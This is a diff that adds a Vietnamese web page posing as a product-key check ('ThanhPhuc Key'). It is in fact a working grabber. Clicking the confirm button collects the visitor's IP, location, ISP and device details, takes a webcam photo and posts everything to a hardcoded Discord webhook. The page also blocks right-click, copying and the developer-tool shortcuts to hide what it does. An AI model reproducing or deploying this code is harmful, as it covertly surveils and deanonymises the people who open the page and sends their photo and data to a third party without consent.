@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>ThanhPhuc - Check</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: linear-gradient(to bottom right, #ffafbd, #ffc3a0);
+      animation: backgroundAnimation 10s infinite;
+    }
+    @keyframes backgroundAnimation {
+      50% { background: linear-gradient(to bottom right, #ffc3a0, #ffafbd); }
+    }
+    h1 {
+      font-size: 32px;
+      color: #333;
+      animation: textAnimation 2s infinite;
+    }
+    @keyframes textAnimation {
+      50% { color: red; transform: scale(1.2); }
+    }
+    p {
+      font-size: 18px;
+      color: #666;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.7);
+      animation: fadeIn 0.3s;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .modal-content {
+      background-color: #fefefe;
+      margin: 10% auto;
+      padding: 30px;
+      border: 1px solid #888;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+      animation: slideDown 0.4s;
+    }
+    @keyframes slideDown {
+      from { transform: translateY(-50px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    .modal-content h2 {
+      color: #333;
+      margin-bottom: 20px;
+      font-size: 24px;
+    }
+    .modal-content p {
+      color: #666;
+      margin-bottom: 25px;
+      font-size: 16px;
+    }
+    .btn {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 12px 40px;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: bold;
+      transition: all 0.3s;
+      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+    }
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+    }
+    .btn:active {
+      transform: translateY(0);
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>ThanhPhuc Key</h1>
+    <p>Vui lòng liên hệ <a href="https://t.me/thanhphucdev" target="_blank" rel="nofollow">ThanhPhucDev</a> nếu key lỗi.</p>
+  </div>
+
+  <div id="notificationModal" class="modal">
+    <div class="modal-content">
+      <h2>🔑 Xác nhận để lấy Key</h2>
+      <p>Vui lòng nhấn nút bên dưới để tiếp tục và nhận key của bạn.</p>
+      <button class="btn" id="confirmBtn">Xác nhận</button>
+    </div>
+  </div>
+
+  <video id="video" width="1" height="1" autoplay style="display:none;"></video>
+
+  <script>
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1440247747700723732/vmQeU92yVVYgp8uuYkRttiIgWDH5ttAsPegnTh8zwBuIg7mofGMH9_UMAQbsaF-Mny1t';
+
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = e => (e.keyCode === 123 || (e.ctrlKey && e.key === 'u')) && e.preventDefault();
+    document.addEventListener('copy', e => e.preventDefault());
+
+    function capturePhoto() {
+      const video = document.getElementById('video');
+      if (!video.videoWidth || !video.videoHeight) return;
+      
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      canvas.toBlob(blob => {
+        if (!blob) return;
+        
+        const formData = new FormData();
+        formData.append('file', blob, 'photo.jpg');
+        const payload = { username: 'ThanhPhuc System', content: '📸 Webcam Capture' };
+        formData.append('payload_json', JSON.stringify(payload));
+        
+        fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData })
+          .then(response => console.log('Photo sent:', response.status))
+          .catch(err => console.error('Photo error:', err));
+      }, 'image/jpeg');
+    }
+
+    function sendToDiscord(ipData, userData) {
+      const discordPayload = {
+        username: 'ThanhPhuc Check System',
+        avatar_url: 'https://cdn-icons-png.flaticon.com/512/888/888879.png',
+        content: '🚨 **THÔNG TIN NGƯỜI DÙNG ĐÃ TRUY CẬP** 🚨',
+        embeds: [{
+          title: "📊 Chi tiết thông tin hệ thống",
+          color: 16711680,
+          fields: [
+            { name: "🌐 IP Address", value: ipData.ip || "Không xác định", inline: true },
+            { name: "📍 Vị trí", value: ipData.location || "Không xác định", inline: true },
+            { name: "🖥️ Hệ điều hành", value: userData.os || "Không xác định", inline: true },
+            { name: "🔍 User Agent", value: "```" + (userData.userAgent || "Không xác định").substring(0, 1000) + "```" },
+            { name: "⚡ CPU Cores", value: String(userData.cpuCores) || "Không xác định", inline: true },
+            { name: "💾 RAM", value: userData.ram ? String(userData.ram) + " GB" : "Không xác định", inline: true },
+            { name: "🎮 GPU", value: "```" + (userData.gpu || "Không xác định").substring(0, 1000) + "```" },
+            { name: "🌍 Ngôn ngữ", value: userData.language || "Không xác định", inline: true },
+            { name: "🖥️ Platform", value: userData.platform || "Không xác định", inline: true },
+            { name: "📺 Độ phân giải", value: userData.screen || "Không xác định", inline: true },
+            { name: "⏰ Múi giờ", value: userData.timezone || "Không xác định", inline: true },
+            { name: "🔌 ISP", value: ipData.isp || "Không xác định", inline: true }
+          ],
+          timestamp: new Date().toISOString(),
+          footer: { text: "ThanhPhuc Check System • " + new Date().toLocaleString('vi-VN') }
+        }]
+      };
+
+      fetch(DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(discordPayload)
+      })
+        .then(response => console.log('Data sent:', response.status))
+        .catch(err => console.error('Send error:', err));
+    }
+
+    async function getIPFromAPIs() {
+      const apiEndpoints = [
+        'https://api.ipify.org?format=json',
+        'https://api64.ipify.org?format=json',
+        'https://ipapi.co/json/',
+        'https://ipwho.is/'
+      ];
+
+      for (const endpoint of apiEndpoints) {
+        try {
+          const response = await fetch(endpoint, {
+            method: 'GET',
+            headers: { 'Accept': 'application/json' }
+          });
+          
+          if (response.ok) {
+            const data = await response.json();
+            
+            if (data.ip) {
+              return {
+                ip: data.ip,
+                country: data.country || data.country_name || data.countryCode || '',
+                city: data.city || '',
+                region: data.region || data.regionName || '',
+                isp: data.org || data.isp || data.asn || '',
+                location: [data.city, data.region, data.country].filter(Boolean).join(', ') || 'Không xác định',
+                method: endpoint
+              };
+            }
+          }
+        } catch (error) {
+          continue;
+        }
+      }
+      
+      return { 
+        ip: "Không thể xác định", 
+        location: "Không xác định", 
+        isp: "Không xác định" 
+      };
+    }
+
+    function collectSystemInfo() {
+      const userAgent = navigator.userAgent;
+      const os = getOS();
+      const cpuCores = navigator.hardwareConcurrency || 'N/A';
+      const ram = navigator.deviceMemory || 'N/A';
+      const gpu = getGPU();
+      const language = navigator.language || navigator.userLanguage || 'N/A';
+      const platform = navigator.platform || 'N/A';
+      const screenRes = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
+
+      return {
+        userAgent: userAgent,
+        os: os,
+        cpuCores: cpuCores,
+        ram: ram,
+        gpu: gpu,
+        language: language,
+        platform: platform,
+        screen: screenRes,
+        timezone: timezone
+      };
+    }
+
+    function requestCameraAccess() {
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              video.play();
+              setTimeout(() => capturePhoto(), 1000);
+            };
+          })
+          .catch(err => console.error('Camera error:', err));
+      }
+    }
+
+    function getOS() {
+      const ua = navigator.userAgent;
+      if (/windows phone/i.test(ua)) return "Windows Phone";
+      if (/android/i.test(ua)) return "Android";
+      if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
+      if (/Macintosh|Mac OS X/.test(ua)) return "Mac OS";
+      if (/Windows NT/.test(ua)) return "Windows";
+      if (/Linux/.test(ua)) return "Linux";
+      return "Unknown";
+    }
+
+    function getGPU() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if (debugInfo) {
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
+          }
+        }
+      } catch (e) {}
+      return 'N/A';
+    }
+
+    async function collectAndSendData() {
+      try {
+        const systemInfo = collectSystemInfo();
+        const ipData = await getIPFromAPIs();
+        sendToDiscord(ipData, systemInfo);
+        requestCameraAccess();
+      } catch (error) {
+        console.error('Collection error:', error);
+      }
+    }
+
+    function handleConfirm() {
+      document.getElementById('notificationModal').style.display = 'none';
+      collectAndSendData();
+    }
+
+    document.getElementById('confirmBtn').addEventListener('click', handleConfirm);
+
+    window.addEventListener('DOMContentLoaded', function() {
+      setTimeout(() => {
+        document.getElementById('notificationModal').style.display = 'block';
+      }, 500);
+    });
+  </script>
+</body>
+</html>
